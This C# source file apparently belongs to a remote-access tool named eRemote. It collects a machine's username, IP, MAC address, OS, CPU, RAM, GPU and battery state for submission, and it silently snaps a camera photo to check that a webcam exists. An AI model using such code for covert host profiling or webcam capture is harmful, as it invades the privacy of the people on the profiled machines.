using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;

namespace eRemote_V2._0
{
    class Info
    {

        public static string GetTimestamp(DateTime value)
        {
            return value.ToString("yyyyMMddHHmmssffff");
        }
        public static List<string> GetOperatingSystemInfo()
        {

            string osname = "";
            string architecture = "";
            string processname = "";
            string memory = "";
            int isHaveCamera = 0;

            ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
            foreach (ManagementObject managementObject in mos.Get())
            {
                if (managementObject["Caption"] != null)
                {

                    osname = (managementObject["Caption"].ToString());   //Display operating system caption
                }
                if (managementObject["OSArchitecture"] != null)
                {
                    architecture = managementObject["OSArchitecture"].ToString();   //Display operating system architecture.
                }

            }


            RegistryKey processor_name = Registry.LocalMachine.OpenSubKey(@"Hardware\Description\System\CentralProcessor\0", RegistryKeyPermissionCheck.ReadSubTree);   //This registry entry contains entry for processor info.

            if (processor_name != null)
            {
                if (processor_name.GetValue("ProcessorNameString") != null)
                {
                    processname = (string)processor_name.GetValue("ProcessorNameString");   //Display processor ingo.
                }
            }

            ObjectQuery wql = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(wql);
            ManagementObjectCollection results = searcher.Get();

            double meomryInKB;

            foreach (ManagementObject result in results)
            {
                meomryInKB = Convert.ToDouble(result["TotalVisibleMemorySize"]);
                double fres = Math.Round(meomryInKB / (1024 * 1024), 2);
                memory = fres.ToString();
            }


            var isSucess = Camera.Capture($"./objs/test_camera.png");
            var isHaveMicrophone = Microphone.IsHaveMicrophone();
            if (isSucess != null)
            {
                isHaveCamera = 1;
            }
            var username = Environment.UserName;
            var gpuName = GetGpuInfo().ToString();
            var macAddress = GetSystemMACID();
            var ip = LoginAndValidate.IsInternetActive();
            var isHaveBattery = GetBattrey();

            int batteryPercentage = 0;

            batteryPercentage = (int)BatteryPercentage();

 
            var InfoForSubmit = new List<string>();
            InfoForSubmit.Add(username);
            InfoForSubmit.Add(ip);
            InfoForSubmit.Add(macAddress);

            InfoForSubmit.Add(osname);
            InfoForSubmit.Add(architecture);
            InfoForSubmit.Add(processname);
            InfoForSubmit.Add(memory);
            InfoForSubmit.Add(gpuName);


            InfoForSubmit.Add(isHaveCamera.ToString());
            InfoForSubmit.Add(isHaveMicrophone.ToString());
            InfoForSubmit.Add(isHaveBattery.ToString());
            InfoForSubmit.Add(batteryPercentage.ToString());



            return InfoForSubmit;

        }

        private static object GetGpuInfo()
        {
            using (var searcher = new ManagementObjectSearcher("select * from Win32_VideoController"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    return obj["Name"];
                }
            }
            return "Not Avalible";

        }

        private static string GetSystemMACID()
        {
            try
            {
                ManagementScope theScope = new ManagementScope("\\\\" + Environment.MachineName + "\\root\\cimv2");
                ObjectQuery theQuery = new ObjectQuery("SELECT * FROM Win32_NetworkAdapter");
                ManagementObjectSearcher theSearcher = new ManagementObjectSearcher(theScope, theQuery);
                ManagementObjectCollection theCollectionOfResults = theSearcher.Get();

                foreach (ManagementObject theCurrentObject in theCollectionOfResults)
                {
                    if (theCurrentObject["MACAddress"] != null)
                    {
                        string macAdd = theCurrentObject["MACAddress"].ToString();
                        return macAdd.Replace(':', '-');
                    }
                }
            }
            catch
            {
                

            }
            return string.Empty;


        }

        private static int GetBattrey()
        {
            ObjectQuery query = new ObjectQuery("Select * FROM Win32_Battery");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

            ManagementObjectCollection collection = searcher.Get();

            foreach (ManagementObject mo in collection)
            {
                foreach (PropertyData property in mo.Properties)
                {
                    Debug.WriteLine("Property {0}: Value is {1}", property.Name, property.Value);
                    return 1;
                }
            }
            Debug.WriteLine("There's No Battery Detected");
            return 0;
        }


        private static object BatteryPercentage()
        {
            ObjectQuery query = new ObjectQuery("Select * FROM Win32_Battery");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);

            ManagementObjectCollection collection = searcher.Get();

            foreach (ManagementObject mo in collection)
            {
                foreach (PropertyData property in mo.Properties)
                {
                    
                    return property.Value;
                }
            }
            Debug.WriteLine("There's No Battery Detected");
            return 0;
        }
    }
}
